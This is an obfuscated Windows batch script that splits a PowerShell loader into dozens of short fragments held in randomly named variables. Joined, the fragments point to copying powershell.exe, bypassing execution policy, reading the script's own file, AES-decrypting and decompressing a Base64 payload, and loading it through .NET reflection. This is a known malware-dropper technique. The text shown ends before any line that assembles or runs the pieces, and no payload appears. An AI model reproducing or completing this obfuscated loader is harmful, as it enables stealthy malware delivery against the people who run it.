@echo off
set "hlEktKBMRG=0\"
set "CFyjfiClVZ=rs"
set "pMPQBwPZjY= C"
set "wTbRmCZckt=Po"
set "VsCvwxESEF=in"
set "tZptFpxgZo=ow"
set "OJdJRcciQn=ll"
set "TKoMVShpsL=Sy"
set "QwgwipsGvh=em"
set "qKAByeSnaX=he"
set "bvGtxarXif=ll"
set "mueyAtCVgS=py"
set "AKMwgiZysi=co"
set "SiInuHqeQr=po"
set "efiRbyHshX=xe"
set "vUIgyhZfMf= /"
set "ihUGbnhIdz=we"
set "eTXSmHoCxi=we"
set "tgvpKRxrir=\v"
set "CTJrdnJyim=.e"
set "VabdUIJSyd=ws"
set "AATlQOLncV=do"
set "mBBvFrzwKG=1."
set "CXXYzmfPDX=:\"
set "nNrjlxSsyn=s\"
set "iiNnXeSyFE=\W"
set "GRTwsoCfLw=Wi"
set "tFvJIVqyBO=rS"
set "RFcPxwbixl=y "
set "dJPHFOUWUK=nd"
set "OMtAiGzcYn=he"
set "VCxHQILCyN=32"
set "rjUTEGCAQc=st"
set "dTJJSqppad=cd"
set "PZpDJmoEsX= %~dp0"
set "fHwZUZiriG= = $"
set "qxgGcKYuFZ=gth)"
set "uUOPkavkzL=lNFn"
set "CKnUoGxlYr=raph"
set "ZCEUbjrCJh=[Sys"
set "fxlKggXRJO=ptog"
set "EwsbEmDczl=m.IO"
set "NIxYWEFrKh=Comp"
set "VUQvrnxgTz=grap"
set "JvWoPGWbPJ='0Pg"
set "NYwAMqMScK=$FZu"
set "PgOofGGOgu=em.I"
set "rbFDaxdMXN=Conv"
set "yJSiyKaMwd=ion."
set "NiOXeDlSoV=m(, "
set "URcLarNIOL=kxXp"
set "oUCogsklsT=-4] "
set "WElcicbjiz=;$hU"
set "bDBkVSEvax='gni"
set "gamxCqkkmL=Hk ="
set "zhVwzQvBdv=);$F"
set "HyXGnQNCSN=Ta, "
set "fjtriXTgVz=a = "
set "oWXAIPVXFa=wTa."
set "CphAJQRVcR=zHhH"
set "yDRLKkwFnR=ert]"
set "PUvsmnTQxA=();$"
set "OVhvWUiZBU=rofi"
set "IRPnBCTuqC=ress"
set "WmWZsbUWsk=hUwT"
set "yTNuYjADOc=rt]:"
set "vcaGpvNffE=g = "
set "utNBgbppUv=tem."
set "xRIRMdRcEj=Secu"
set "kTcrOflIzY=($gR"
set "JLWXpfOwEY=-ep "
set "YTlprypPAZ=.Dis"
set "qrRpshGtYM=('%~f0'"
set "CuJOJSEtPa=oryS"
set "jKYvzuWFvF=);$W"
set "GAHZaacLsY=.Key"
set "oPPwONfSHy=bypa"
set "NcgyfWaXww=ne);"
set "GotpmRVBfR=nage"
set "ghasDRZnmt=lit("
set "XCKiiFegdE=::De"
set "KExOLxmZQS=]::("
set "hAitmnDizD=L4Yi"
set "kQBcKpOVeC=.Mem"
set "WqsVnliXvh=::('"
set "kBlqqNgQaZ=trea"
set "WeuKZJrNYc=);$G"
set "GtVBZXWbUE=gnir"
set "QdsdKiaVWv=JHEl"
set "WxadkYafRo=Syst"
set "soaHhyrUDb=tsWi"
set "cXLtrQHvCw=, $l"
set "wSNmNldIaC==');"
set "xUtvWNwgQn=Fina"
set "GfztmJcqay=oint"
set "mUsLFjsmGi=NFnx"
set "fKArgaAVoK=gRXz"
set "OVLRrcPpwz= [Sy"
set "NMJqiTjBZX=..-1"
set "EtYJbLWCZs=PTtG"
set "xqVURRVdif=Mode"
set "DJQwzXsMxi=urit"
set "WKeBqyqAZy=ateD"
set "KcDGTMtZJj=.-16"
set "DbxACUkzjN=FqmE"
set "ltYHnFDdta=ct S"
set "BoPGImTxMy== $F"
set "fJxUtZuRrX=ode]"
set "OumjhklUBa=($gR"
set "HYGPLOievi=x, 0"
set "KSidjOXxwm=Zuvl"
set "EEOBxacmnE= = $"
set "SKsEuOAbBI=-1.."
set "LlBquclHUs=WzU."
set "IJNWQcYqYZ=lNFn"
set "lBFnfVwSpl=[-1."
set "HtaSVfDTwV=.Cre"
set "SIOnHJPJOJ=stem"
set "iXUfOuGLJf=$WSl"
set "emQBALmQbB=7;$F"
set "nvIcElJaUR=;$JH"
set "BvulOgMaBw=$WSl"
set "yfzXowwozo=x = "
set "yjuHlcqJwW=$Fqm"
set "TCIDNZmzzY=.Cry"
set "YksFYhlMQS=ptog"
set "omeoztTyVp=hy.A"
set "TvfWkuCNYw=PxEW"
set "RLGwFIabBk=[Env"
set "SiIWPaOVsI=Invo"
set "ldSFWgvUYh=Comp"
set "hXKIhIFiac=n ''"
set "mvMJLnvTdB=BC;$"
set "jJfWmOIQvU=.Ass"
set "ZRrTrdLhqY=join"
set "qcYZYAyJwr=.Com"
set "HXeQjmtqwX=Zuvl"
set "zMiWQzTTnD=$zeh"
set "ABwCBIZigl='txe"
set "DDvQesIlFN=th('"
set "QjjxfPOMJU=Disp"
set "cacyyMHutv=saBm"
set "yrxlFMEKiG=O.Me"
set "JZbRCUomPk=();$"
set "aQaDtlmKVk=eam("
set "zBGwpnJlwh=$hUw"
set "fRIUFfTcgB=l.Pa"
set "jphYovsxmy=tem."
set "xBeRhbvXIO=flec"
set "hXMhQioWKC=ptor"
set "EoesKOfjXE= if "
set "dPYQzLBrbh=).Sp"
set "JJuQRWbXNT=)($C"
set "PfoaxbcSvi=FZuv"
set "wWxmpLcbpP=lYE."
set "wCwVzrmZHF= = ["
set "isgEVrjBkR=]::N"
